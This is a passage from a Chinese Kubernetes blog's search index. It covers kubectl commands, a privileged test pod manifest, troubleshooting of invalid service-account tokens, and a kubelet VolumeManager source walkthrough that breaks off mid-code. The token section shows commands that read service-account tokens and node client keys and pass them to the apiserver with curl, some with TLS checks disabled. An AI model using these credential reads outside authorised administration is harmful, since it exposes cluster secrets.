kubeflow Active 6d kubemark Active 5d23h monitoring Active 4d23h   test pod启动yaml test-pod.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  apiVersion:v1kind:Podmetadata:name:testpodlabels:app:myappversion:v1spec:# schedulerName: kube-batchcontainers:- name:appimage:busybox:1.31.0imagePullPolicy:IfNotPresentcommand:[\u0026#34;sleep\u0026#34;,\u0026#34;3600\u0026#34;]securityContext:privileged:trueresources:limits:cpu:\u0026#34;0.5\u0026#34;# memory: \u0026#34;100Mi\u0026#34;requests:cpu:\u0026#34;0.5\u0026#34;# memory: \u0026#34;100Mi\u0026#34;affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:# - matchExpressions:# - key: node-role.kubernetes.io/master# operator: In# values:# - \u0026#34;true\u0026#34;- matchExpressions:- key:kubernetes.io/hostnameoperator:Invalues:- \u0026#34;test-node\u0026#34;  附录 一些命令\n1 2  kubectl get po -A |grep latency- |grep -v Running |wc -l   ","permalink":"http://bingerambo.com/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/","tags":["K8S"],"title":"K8S常用操作命令集合"},{"categories":["K8S"],"contents":"invalid token问题定位分析，以及排查方法\n问题现象 环境中出现了某插件业务pod的k8s client访问apiserver时认证失败，错误原因：unauthorized\n查看apiserver日志，报错信息如下：\n1  invalid bearer token, token has been invalidated   检查token有效性测试  找到问题pod使用的token，有两种方式途径获取   进入pod中，/var/run/secrets/kubernetes.io/serviceaccount/token 在节点上，访问pod的数据目录获取  1 2 3 4 5 6 7 8 9 10 11 12 13  # 方式1：在pod内部获取 TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token` CAFILE=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt # 方式2：在master节点上，从k8s和pod数据目录内获取 #TOKEN=`cat /var/lib/kubelet/pods/podid/volumes/kubernetes.io~secret/podname/token` #CAFILE=/etc/kubernetes/pki/ca.crt # 接口正常访问前提：该token有获取pods权限 #podlist=https://100.7.36.176:6443/api/v1/namespaces/default/pods podlist=https://100.7.36.176:6443/api/v1/namespaces/aistation/pods # curl apiserver curl --cacert $CAFILE --header \u0026#34;Authorization: Bearer $TOKEN\u0026#34; $podlist   如果上面接口访问正常，则说明token有效。\n如果出现token无效导致失败，则进行下面分析。\n分析流程 1. 查看k8s系统保存的某组件的secret信息 1 2  keyword=deviceplugin kubectl get secrect |grep $keyword   2. 查看token信息 1  kubectl describe secrect xxx   3. 查看某组件pod的挂载注入信息 pod的token是在pod创建时注入的。所以查看pod信息能够看到pod mount信息\n检查是否从系统保存的secret信息获取的token\n1 2  # pod 内部 cat /var/run/secrets/kubernetes.io/serviceaccount/token   或者 查看挂载信息\n1  mount |grep kubernetes.io~secret   /var/run/secrets/kubernetes.io/serviceaccount/ 目录\n1 2 3 4 5  [root@node131 coredns-token-hgchg]#ll /var/run/secrets/kubernetes.io/serviceaccount/ lrwxrwxrwx. 1 root root 13 2月 4 15:11 ca.crt -\u0026gt; ..data/ca.crt lrwxrwxrwx. 1 root root 16 2月 4 15:11 namespace -\u0026gt; ..data/namespace lrwxrwxrwx. 1 root root 12 2月 4 15:11 token -\u0026gt; ..data/token   检查是否从系统获取的最新token\n 说明：如果不一致，说明此时pod持有的token无效，就会导致pod访问aiserver认证失败\n 原因 暂时分析如下，后续总结更新\n 集群中的pod的serviceaccount有更新，包括secret，但是pod由于某原因没有及时同步更新，导致token无效，api接口无法认证通过  解决 删除pod，pod重建时重新获取token，访问apiserver正常\n参考  https://github.com/kubernetes/kubernetes/issues/22351 https://github.com/kubernetes/kubernetes/issues/72026  附录 token脚本 k8s_token_test.sh\n1 2 3 4 5 6  #!/bin/bash  token=$(echo $1|base64 -d) echo $token curl -XGET -H \u0026#34;Authorization:Bearer $token\u0026#34; -k https://127.0.0.1:10248/healthz   配置命令 带证书文件进行k8s apiserver的https服务\n用命令行总是很麻烦，因为要自定义一些证书的位置。。。。。。。\n master节点上访问服务  1 2 3 4 5 6 7 8  # master节点上 curl https://10.151.11.61:6443/api/v1/nodes \\  --cacert /etc/kubernetes/pki/ca.crt \\  --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \\  --key /etc/kubernetes/pki/apiserver-kubelet-client.key    node节点上访问服务  1 2 3 4 5 6  # node节点上 curl https://10.151.11.61:6443/api/v1/nodes \\  --cacert /home/wangb/ssl/ca.crt \\  --cert /home/wangb/ssl/apiserver-kubelet-client.crt \\  --key /home/wangb/ssl/apiserver-kubelet-client.key   ","permalink":"http://bingerambo.com/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题"},{"categories":["K8S"],"contents":"kubelet volume manager组件源码分析\n k8s版本：1.20.0  总体 volume模块图 kubelet调用VolumeManager，为pods准备存储设备，存储设备就绪会挂载存储设备到pod所在的节点上，并在容器启动的时候挂载在容器指定的目录中；同时，删除卸载不再使用的存储； kubernetes采用Volume Plugins来实现存储卷的挂载等操作\nvolume manager 源码位置：kubernetes\\pkg\\kubelet\\volumemanager\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134  const ( // reconcilerLoopSleepPeriod is the amount of time the reconciler loop waits  // between successive executions  reconcilerLoopSleepPeriod = 100 * time.Millisecond // desiredStateOfWorldPopulatorLoopSleepPeriod is the amount of time the  // DesiredStateOfWorldPopulator loop waits between successive executions  desiredStateOfWorldPopulatorLoopSleepPeriod = 100 * time.Millisecond // desiredStateOfWorldPopulatorGetPodStatusRetryDuration is the amount of  // time the DesiredStateOfWorldPopulator loop waits between successive pod  // cleanup calls (to prevent calling containerruntime.GetPodStatus too  // frequently).  desiredStateOfWorldPopulatorGetPodStatusRetryDuration = 2 * time.Second // podAttachAndMountTimeout is the maximum amount of time the  // WaitForAttachAndMount call will wait for all volumes in the specified pod  // to be attached and mounted. Even though cloud operations can take several  // minutes to complete, we set the timeout to 2 minutes because kubelet  // will retry in the next sync iteration. This frees the associated  // goroutine of the pod to process newer updates if needed (e.g., a delete  // request to the pod).  // Value is slightly offset from 2 minutes to make timeouts due to this  // constant recognizable.  podAttachAndMountTimeout = 2*time.Minute + 3*time.Second // podAttachAndMountRetryInterval is the amount of time the GetVolumesForPod  // call waits before retrying  podAttachAndMountRetryInterval = 300 * time.Millisecond // waitForAttachTimeout is the maximum amount of time a  // operationexecutor.Mount call will wait for a volume to be attached.  // Set to 10 minutes because we\u0026#39;ve seen attach operations take several  // minutes to complete for some volume plugins in some cases. While this  // operation is waiting it only blocks other operations on the same device,  // other devices are not affected.  waitForAttachTimeout = 10 * time.Minute ) // VolumeManager runs a set of asynchronous loops that figure out which volumes // need to be attached/mounted/unmounted/detached based on the pods scheduled on // this node and makes it so. type VolumeManager interface { // Starts the volume manager and all the asynchronous loops that it controls  Run(sourcesReady config.SourcesReady, stopCh \u0026lt;-chan struct{}) // WaitForAttachAndMount processes the volumes referenced in the specified  // pod and blocks until they are all attached and mounted (reflected in  // actual state of the world).  // An error is returned if all volumes are not attached and mounted within  // the duration defined in podAttachAndMountTimeout.  WaitForAttachAndMount(pod *v1.Pod) error // GetMountedVolumesForPod returns a VolumeMap containing the volumes  // referenced by the specified pod that are successfully attached and  // mounted. The key in the map is the OuterVolumeSpecName (i.e.  // pod.Spec.Volumes[x].Name). It returns an empty VolumeMap if pod has no  // volumes.  GetMountedVolumesForPod(podName types.UniquePodName) container.VolumeMap // GetExtraSupplementalGroupsForPod returns a list of the extra  // supplemental groups for the Pod. These extra supplemental groups come  // from annotations on persistent volumes that the pod depends on.  GetExtraSupplementalGroupsForPod(pod *v1.Pod) []int64 // GetVolumesInUse returns a list of all volumes that implement the volume.Attacher  // interface and are currently in use according to the actual and desired  // state of the world caches. A volume is considered \u0026#34;in use\u0026#34; as soon as it  // is added to the desired state of world, indicating it *should* be  // attached to this node and remains \u0026#34;in use\u0026#34; until it is removed from both  // the desired state of the world and the actual state of the world, or it  // has been unmounted (as indicated in actual state of world).  GetVolumesInUse() []v1.UniqueVolumeName // ReconcilerStatesHasBeenSynced returns true only after the actual states in reconciler  // has been synced at least once after kubelet starts so that it is safe to update mounted  // volume list retrieved from actual state.  ReconcilerStatesHasBeenSynced() bool // VolumeIsAttached returns true if the given volume is attached to this  // node.  VolumeIsAttached(volumeName v1.UniqueVolumeName) bool // Marks the specified volume as having successfully been reported as \u0026#34;in  // use\u0026#34; in the nodes\u0026#39;s volume status.  MarkVolumesAsReportedInUse(volumesReportedAsInUse []v1.UniqueVolumeName) } // volumeManager implements the VolumeManager interface type volumeManager struct { // kubeClient is the kube API client used by DesiredStateOfWorldPopulator to  // communicate with the API server to fetch PV and PVC objects  kubeClient clientset.Interface // volumePluginMgr is the volume plugin manager used to access volume  // plugins. It must be pre-initialized.  volumePluginMgr *volume.VolumePluginMgr // desiredStateOfWorld is a data structure containing the desired state of  // the world according to the volume manager: i.e. what volumes should be  // attached and which pods are referencing the volumes).  // The data structure is populated by the desired state of the world  // populator using the kubelet pod manager.  desiredStateOfWorld cache.DesiredStateOfWorld // actualStateOfWorld is a data structure containing the actual state of  // the world according to the manager: i.e. which volumes are attached to  // this node and what pods the volumes are mounted to.  // The data structure is populated upon successful completion of attach,  // detach, mount, and unmount actions triggered by the reconciler.  actualStateOfWorld cache.ActualStateOfWorld // operationExecutor is used to start asynchronous attach, detach, mount,  // and unmount operations.  operationExecutor operationexecutor.OperationExecutor // reconciler runs an asynchronous periodic loop to reconcile the  // desiredStateOfWorld with the actualStateOfWorld by triggering attach,  // detach, mount, and unmount operations using the operationExecutor.  reconciler reconciler.Reconciler // desiredStateOfWorldPopulator runs an asynchronous periodic loop to  // populate the desiredStateOfWorld using the kubelet PodManager.  desiredStateOfWorldPopulator populator.DesiredStateOfWorldPopulator // csiMigratedPluginManager keeps track of CSI migration status of plugins  csiMigratedPluginManager csimigration.PluginManager // intreeToCSITranslator translates in-tree volume specs to CSI  intreeToCSITranslator csimigration.InTreeToCSITranslator }   kubelet会调用VolumeManager，为pods准备存储设备，存储设备就绪会挂载存储设备到pod所在的节点上，并在容器启动的时候挂载在容器指定的目录中；同时，删除卸载不在使用的存储\nVolumeManager接口说明  运行在kubelet 里让存储Ready的部件，主要是mount/unmount（attach/detach可选） pod调度到这个node上后才会有卷的相应操作，所以它的触发端是kubelet（严格讲是kubelet里的pod manager），根据Pod Manager里pod spec里申明的存储来触发卷的挂载操作 Kubelet会监听到调度到该节点上的pod声明，会把pod缓存到Pod Manager中，VolumeManager通过Pod Manager获取PV/PVC的状态，并进行分析出具体的attach/detach、mount/umount, 操作然后调用plugin进行相应的业务处理  volumeManager结构体 volumeManager结构体实现了VolumeManager接口，主要有两个需要注意：\n desiredStateOfWorld：预期状态，volume需要被attach，哪些pods引用这个volume actualStateOfWorld：实际状态，volume已经被atttach哪个node，哪个pod mount volume  desiredStateOfWorld 和 actualStateOfWorld   desiredStateOfWorld为理想的volume情况，它主要是根据podManger获取所有的Pod信息，从中提取Volume信息。\n  actualStateOfWorld则是实际的volume情况。\n  desiredStateOfWorldPopulator通过podManager去构建desiredStateOfWorld。\n  reconciler的工作主要是比较actualStateOfWorld和desiredStateOfWorld的差别，然后进行volume的创建、删除和修改，最后使二者达到一致。\n  流程 新建 NewVolumeManager中主要构造了几个volume控制器\n volumePluginMgr 和 csiMigratedPluginManager desiredStateOfWorldPopulator reconciler  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219  // NewMainKubelet instantiates a new Kubelet object along with all the required internal modules. // No initialization of Kubelet and its modules should happen here. func NewMainKubelet(){ // ......  // setup volumeManager  klet.volumeManager = volumemanager.NewVolumeManager( kubeCfg.EnableControllerAttachDetach, nodeName, klet.podManager, klet.statusManager, klet.kubeClient, klet.volumePluginMgr, klet.containerRuntime, kubeDeps.Mounter, kubeDeps.HostUtil, klet.getPodsDir(), kubeDeps.Recorder, experimentalCheckNodeCapabilitiesBeforeMount, keepTerminatedPodVolumes, volumepathhandler.NewBlockVolumePathHandler()) // ...... } // NewVolumeManager returns a new concrete instance implementing the // VolumeManager interface. // // kubeClient - kubeClient is the kube API client used by DesiredStateOfWorldPopulator // to communicate with the API server to fetch PV and PVC objects // volumePluginMgr - the volume plugin manager used to access volume plugins. // Must be pre-initialized. func NewVolumeManager(){ vm := \u0026amp;volumeManager{ kubeClient: kubeClient, volumePluginMgr: volumePluginMgr, desiredStateOfWorld: cache.NewDesiredStateOfWorld(volumePluginMgr), actualStateOfWorld: cache.NewActualStateOfWorld(nodeName, volumePluginMgr), operationExecutor: operationexecutor.NewOperationExecutor(operationexecutor.NewOperationGenerator( kubeClient, volumePluginMgr, recorder, checkNodeCapabilitiesBeforeMount, blockVolumePathHandler)), } intreeToCSITranslator := csitrans.New() csiMigratedPluginManager := csimigration.NewPluginManager(intreeToCSITranslator) vm.intreeToCSITranslator = intreeToCSITranslator vm.csiMigratedPluginManager = csiMigratedPluginManager vm.desiredStateOfWorldPopulator = populator.NewDesiredStateOfWorldPopulator( kubeClient, desiredStateOfWorldPopulatorLoopSleepPeriod, desiredStateOfWorldPopulatorGetPodStatusRetryDuration, podManager, podStatusProvider, vm.desiredStateOfWorld, vm.actualStateOfWorld, kubeContainerRuntime, keepTerminatedPodVolumes, csiMigratedPluginManager, intreeToCSITranslator, volumePluginMgr) vm.reconciler = reconciler.NewReconciler( kubeClient, controllerAttachDetachEnabled, reconcilerLoopSleepPeriod, waitForAttachTimeout, nodeName, vm.desiredStateOfWorld, vm.actualStateOfWorld, vm.desiredStateOfWorldPopulator.HasAddedPods, vm.operationExecutor, mounter, hostutil, volumePluginMgr, kubeletPodsDir) return vm } // NewDesiredStateOfWorldPopulator returns a new instance of // DesiredStateOfWorldPopulator. // // kubeClient - used to fetch PV and PVC objects from the API server // loopSleepDuration - the amount of time the populator loop sleeps between // successive executions // podManager - the kubelet podManager that is the source of truth for the pods // that exist on this host // desiredStateOfWorld - the cache to populate func NewDesiredStateOfWorldPopulator( kubeClient clientset.Interface, loopSleepDuration time.Duration, getPodStatusRetryDuration time.Duration, podManager pod.Manager, podStatusProvider status.PodStatusProvider, desiredStateOfWorld cache.DesiredStateOfWorld, actualStateOfWorld cache.ActualStateOfWorld, kubeContainerRuntime kubecontainer.Runtime, keepTerminatedPodVolumes bool, csiMigratedPluginManager csimigration.PluginManager, intreeToCSITranslator csimigration.InTreeToCSITranslator, volumePluginMgr *volume.VolumePluginMgr) DesiredStateOfWorldPopulator { return \u0026amp;desiredStateOfWorldPopulator{ kubeClient: kubeClient, loopSleepDuration: loopSleepDuration, getPodStatusRetryDuration: getPodStatusRetryDuration, podManager: podManager, podStatusProvider: podStatusProvider, desiredStateOfWorld: desiredStateOfWorld, actualStateOfWorld: actualStateOfWorld, pods: processedPods{ processedPods: make(map[volumetypes.UniquePodName]bool)}, kubeContainerRuntime: kubeContainerRuntime, keepTerminatedPodVolumes: keepTerminatedPodVolumes, hasAddedPods: false, hasAddedPodsLock: sync.RWMutex{}, csiMigratedPluginManager: csiMigratedPluginManager, intreeToCSITranslator: intreeToCSITranslator, volumePluginMgr: volumePluginMgr, } } type desiredStateOfWorldPopulator struct { kubeClient clientset.Interface loopSleepDuration time.Duration getPodStatusRetryDuration time.Duration podManager pod.Manager podStatusProvider status.PodStatusProvider desiredStateOfWorld cache.DesiredStateOfWorld actualStateOfWorld cache.ActualStateOfWorld pods processedPods kubeContainerRuntime kubecontainer.Runtime timeOfLastGetPodStatus time.Time keepTerminatedPodVolumes bool hasAddedPods bool hasAddedPodsLock sync.RWMutex csiMigratedPluginManager csimigration.PluginManager intreeToCSITranslator csimigration.InTreeToCSITranslator volumePluginMgr *volume.VolumePluginMgr } // NewReconciler returns a new instance of Reconciler. // // controllerAttachDetachEnabled - if true, indicates that the attach/detach // controller is responsible for managing the attach/detach operations for // this node, and therefore the volume manager should not // loopSleepDuration - the amount of time the reconciler loop sleeps between // successive executions // waitForAttachTimeout - the amount of time the Mount function will wait for // the volume to be attached // nodeName - the Name for this node, used by Attach and Detach methods // desiredStateOfWorld - cache containing the desired state of the world // actualStateOfWorld - cache containing the actual state of the world // populatorHasAddedPods - checker for whether the populator has finished // adding pods to the desiredStateOfWorld cache at least once after sources // are all ready (before sources are ready, pods are probably missing) // operationExecutor - used to trigger attach/detach/mount/unmount operations // safely (prevents more than one operation from being triggered on the same // volume) // mounter - mounter passed in from kubelet, passed down unmount path // hostutil - hostutil passed in from kubelet // volumePluginMgr - volume plugin manager passed from kubelet func NewReconciler( kubeClient clientset.Interface, controllerAttachDetachEnabled bool, loopSleepDuration time.Duration, waitForAttachTimeout time.Duration, nodeName types.NodeName, desiredStateOfWorld cache.DesiredStateOfWorld, actualStateOfWorld cache.ActualStateOfWorld, populatorHasAddedPods func() bool, operationExecutor operationexecutor.OperationExecutor, mounter mount.Interface, hostutil hostutil.HostUtils, volumePluginMgr *volumepkg.VolumePluginMgr, kubeletPodsDir string) Reconciler { return \u0026amp;reconciler{ kubeClient: kubeClient, controllerAttachDetachEnabled: controllerAttachDetachEnabled, loopSleepDuration: loopSleepDuration, waitForAttachTimeout: waitForAttachTimeout, nodeName: nodeName, desiredStateOfWorld: desiredStateOfWorld, actualStateOfWorld: actualStateOfWorld, populatorHasAddedPods: populatorHasAddedPods, operationExecutor: operationExecutor, mounter: mounter, hostutil: hostutil, volumePluginMgr: volumePluginMgr, kubeletPodsDir: kubeletPodsDir, timeOfLastSync: time.Time{}, } } type reconciler struct { kubeClient clientset.Interface controllerAttachDetachEnabled bool loopSleepDuration time.Duration waitForAttachTimeout time.Duration nodeName types.NodeName desiredStateOfWorld cache.DesiredStateOfWorld actualStateOfWorld cache.ActualStateOfWorld populatorHasAddedPods func() bool operationExecutor operationexecutor.OperationExecutor mounter mount.Interface hostutil hostutil.HostUtils volumePluginMgr *volumepkg.VolumePluginMgr kubeletPodsDir string timeOfLastSync time.Time }   启动 kl.volumeManager.Run\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  // Run starts the kubelet reacting to config updates func (kl *Kubelet) Run(updates \u0026lt;-chan kubetypes.PodUpdate) { // Start volume manager  go kl.volumeManager.Run(kl.sourcesReady, wait.NeverStop) go wait.Until(kl.updateRuntimeUp, 5*time.Second, wait.NeverStop) // Set up iptables util rules  if kl.makeIPTablesUtilChains { kl.initNetworkUtil() } // Start a goroutine responsible for killing pods (that are not properly  // handled by pod workers).  go wait.Until(kl.podKiller.PerformPodKillingWork, 1*time.Second, wait.NeverStop) // Start component sync loops.  kl.statusManager.Start() kl.probeManager.Start() // Start syncing RuntimeClasses if enabled.  if kl.runtimeClassManager != nil { kl.runtimeClassManager.Start(wait.NeverStop) } // Start the pod lifecycle event generator.  kl.pleg.Start() kl.syncLoop(updates, kl) } func (vm *volumeManager) Run(sourcesReady config.SourcesReady, stopCh \u0026lt;-chan struct{}) { defer runtime.HandleCrash() if vm.kubeClient != nil { // start informer for CSIDriver  go vm.volumePluginMgr.Run(stopCh) } go vm.desiredStateOfWorldPopulator.Run(sourcesReady, stopCh) klog.V(2).Infof(\u0026#34;The desired_state_of_world populator starts\u0026#34;) klog.Infof(\u0026#34;Starting Kubelet Volume Manager\u0026#34;) go vm.reconciler.Run(stopCh) metrics.Register(vm.actualStateOfWorld, vm.desiredStateOfWorld, vm.volumePluginMgr) \u0026lt;-stopCh klog.Infof(\u0026#34;Shutting down Kubelet Volume Manager\u0026#34;) }   启动子模块有\n 如果有volumePlugin（默认安装时没有插件），启动volumePluginMgr 启动 desiredStateOfWorldPopulator：从apiserver同步到的pod信息，更新DesiredStateOfWorld  findAndAddNewPods() findAndRemoveDeletedPods() 每隔dswp.getPodStatusRetryDuration时长，进行findAndRemoveDeletedPods()   启动 reconciler：预期状态和实际状态的协调者，负责调整实际状态至预期状态  desiredStateOfWorldPopulator 通过populatorLoop()来更新DesiredStateOfWorld\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  func (dswp *desiredStateOfWorldPopulator) populatorLoop() { dswp.findAndAddNewPods() // findAndRemoveDeletedPods() calls out to the container runtime to  // determine if the containers for a given pod are terminated. This is  // an expensive operation, therefore we limit the rate that  // findAndRemoveDeletedPods() is called independently of the main  // populator loop.  if time.Since(dswp.timeOfLastGetPodStatus) \u0026lt; dswp.getPodStatusRetryDuration { klog.V(5).Infof( \u0026#34;Skipping findAndRemoveDeletedPods(). Not permitted until %v (getPodStatusRetryDuration %v).\u0026#34;, dswp.timeOfLastGetPodStatus.Add(dswp.getPodStatusRetryDuration), dswp.getPodStatusRetryDuration) return } dswp.findAndRemoveDeletedPods() }   findAndAddNewPods  遍历pod manager中所有pod 过滤掉Terminated态的pod，进行processPodVolumes，把这些pod添加到desired state of world  就是通过podManager获取所有的pods，然后调用processPodVolumes去更新desiredStateOfWorld。但是这样只能更新新增加的Pods的Volume信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  // Iterate through all pods and add to desired state of world if they don\u0026#39;t // exist but should func (dswp *desiredStateOfWorldPopulator) findAndAddNewPods() { // Map unique pod name to outer volume name to MountedVolume.  mountedVolumesForPod := make(map[volumetypes.UniquePodName]map[string]cache.MountedVolume) if utilfeature.DefaultFeatureGate.Enabled(features.ExpandInUsePersistentVolumes) { for _, mountedVolume := range dswp.actualStateOfWorld.GetMountedVolumes() { mountedVolumes, exist := mountedVolumesForPod[mountedVolume.PodName] if !exist { mountedVolumes = make(map[string]cache.MountedVolume) mountedVolumesForPod[mountedVolume.PodName] = mountedVolumes } mountedVolumes[mountedVolume.OuterVolumeSpecName] = mountedVolume } } processedVolumesForFSResize := sets.NewString() for _, pod := range dswp.podManager.GetPods() { if dswp.isPodTerminated(pod) { // Do not (re)add volumes for terminated pods  continue } dswp.processPodVolumes(pod, mountedVolumesForPod, processedVolumesForFSResize) } }   processPodVolumes 更新desiredStateOfWorld\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94  // processPodVolumes processes the volumes in the given pod and adds them to the // desired state of the world. func (dswp *desiredStateOfWorldPopulator) processPodVolumes( pod *v1.Pod, mountedVolumesForPod map[volumetypes.UniquePodName]map[string]cache.MountedVolume, processedVolumesForFSResize sets.String) { if pod == nil { return } uniquePodName := util.GetUniquePodName(pod) // 如果先前在processedPods map中，表示无需处理，提前返回  if dswp.podPreviouslyProcessed(uniquePodName) { return } allVolumesAdded := true // 获取 全部 容器的mount信息container.VolumeMounts  // 对pod下所有container的volumeDevices与volumeMounts加入map中  mounts, devices := util.GetPodVolumeNames(pod) expandInUsePV := utilfeature.DefaultFeatureGate.Enabled(features.ExpandInUsePersistentVolumes) // Process volume spec for each volume defined in pod  for _, podVolume := range pod.Spec.Volumes { if !mounts.Has(podVolume.Name) \u0026amp;\u0026amp; !devices.Has(podVolume.Name) { // Volume is not used in the pod, ignore it.  // pod中定义了pod.Spec.Volumes[x].name，但是容器没有挂载使用，则忽略  klog.V(4).Infof(\u0026#34;Skipping unused volume %q for pod %q\u0026#34;, podVolume.Name, format.Pod(pod)) continue } // createVolumeSpec创建并返回一个可变的volume.Spec的对象。如果需要，它可通过PVC的间接引用以获得PV对象。当无法获取卷时返回报错  pvc, volumeSpec, volumeGidValue, err := dswp.createVolumeSpec(podVolume, pod, mounts, devices) if err != nil { klog.Errorf( \u0026#34;Error processing volume %q for pod %q: %v\u0026#34;, podVolume.Name, format.Pod(pod), err) dswp.desiredStateOfWorld.AddErrorToPod(uniquePodName, err.Error()) allVolumesAdded = false continue } // Add volume to desired state of world  // 调用FindPluginBySpec函数根据volume.spec找到volume plugin  // isAttachableVolume函数，检查插件是否需要attach,不是所有的插件都需要实现AttachableVolumePlugin接口  // 记录volume与pod之间的关系  // 对pod name标记为已处理，actual_state_of_world标记重新挂载  _, err = dswp.desiredStateOfWorld.AddPodToVolume( uniquePodName, pod, volumeSpec, podVolume.Name, volumeGidValue) if err != nil { klog.Errorf( \u0026#34;Failed to add volume %s (specName: %s) for pod %q to desiredStateOfWorld: %v\u0026#34;, podVolume.Name, volumeSpec.Name(), uniquePodName, err) dswp.desiredStateOfWorld.AddErrorToPod(uniquePodName, err.Error()) allVolumesAdded = false } else { klog.V(4).Infof( \u0026#34;Added volume %q (volSpec=%q) for pod %q to desired state.\u0026#34;, podVolume.Name, volumeSpec.Name(), uniquePodName) } // 是否有卷容量调整操作, 实际上是比较 pvc.Status.Capacity 和 pvc.Spec.Capacity  // pvc.Spec.Capacity \u0026gt; pvc.Status.Capacity时，进行扩容处理  if expandInUsePV { dswp.checkVolumeFSResize(pod, podVolume, pvc, volumeSpec, uniquePodName, mountedVolumesForPod, processedVolumesForFSResize) } } // some of the volume additions may have failed, should not mark this pod as fully processed  if allVolumesAdded { dswp.markPodProcessed(uniquePodName) // New pod has been synced. Re-mount all volumes that need it  // (e.g. DownwardAPI)  dswp.actualStateOfWorld.MarkRemountRequired(uniquePodName) // Remove any stored errors for the pod, everything went well in this processPodVolumes  dswp.desiredStateOfWorld.PopPodErrors(uniquePodName) } else if dswp.podHasBeenSeenOnce(uniquePodName) { // For the Pod which has been processed at least once, even though some volumes  // may not have been reprocessed successfully this round, we still mark it as processed to avoid  // processing it at a very high frequency. The pod will be reprocessed when volume manager calls  // ReprocessPod() which is triggered by SyncPod.  dswp.markPodProcessed(uniquePodName) } }   findAndRemoveDeletedPods  由于findAndRemoveDeletedPods 代价比较高昂，因此会检查执行的间隔时间。 遍历desiredStateOfWorld.GetVolumesToMount()的挂载volumes，根据volumeToMount.Pod判断该Volume所属的Pod是否存在于podManager。  如果存在podExists，则继续判断pod是否终止：如果pod为终止则忽略 根据containerRuntime进一步判断pod中的全部容器是否终止：如果该pod仍有容器未终止，则忽略 根据actualStateOfWorld.PodExistsInVolume判断：Actual state没有该pod的挂载volume，但pod manager仍有该pod，则忽略 删除管理器中该pod的该挂载卷：desiredStateOfWorld.DeletePodFromVolume(volumeToMount.PodName, volumeToMount.VolumeName) 删除管理器中该pod信息(desiredStateOfWorldPopulator.pods[volumeToMount.PodName])：deleteProcessedPod(volumeToMount.PodName)    简单说，对于pod manager已经不存在的pods，findAndRemoveDeletedPods会删除更新desiredStateOfWorld中这些pod和其volume记录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88  // Iterate through all pods in desired state of world, and remove if they no // longer exist func (dswp *desiredStateOfWorldPopulator) findAndRemoveDeletedPods() { var runningPods []*kubecontainer.Pod runningPodsFetched := false for _, volumeToMount := range dswp.desiredStateOfWorld.GetVolumesToMount() { pod, podExists := dswp.podManager.GetPodByUID(volumeToMount.Pod.UID) if podExists { // check if the attachability has changed for this volume  if volumeToMount.PluginIsAttachable { attachableVolumePlugin, err := dswp.volumePluginMgr.FindAttachablePluginBySpec(volumeToMount.VolumeSpec) // only this means the plugin is truly non-attachable  if err == nil \u0026amp;\u0026amp; attachableVolumePlugin == nil { // It is not possible right now for a CSI plugin to be both attachable and non-deviceMountable  // So the uniqueVolumeName should remain the same after the attachability change  dswp.desiredStateOfWorld.MarkVolumeAttachability(volumeToMount.VolumeName, false) klog.Infof(\u0026#34;Volume %v changes from attachable to non-attachable.\u0026#34;, volumeToMount.VolumeName) continue } } // Skip running pods  if !dswp.isPodTerminated(pod) { continue } if dswp.keepTerminatedPodVolumes { continue } } // Once a pod has been deleted from kubelet pod manager, do not delete  // it immediately from volume manager. Instead, check the kubelet  // containerRuntime to verify that all containers in the pod have been  // terminated.  if 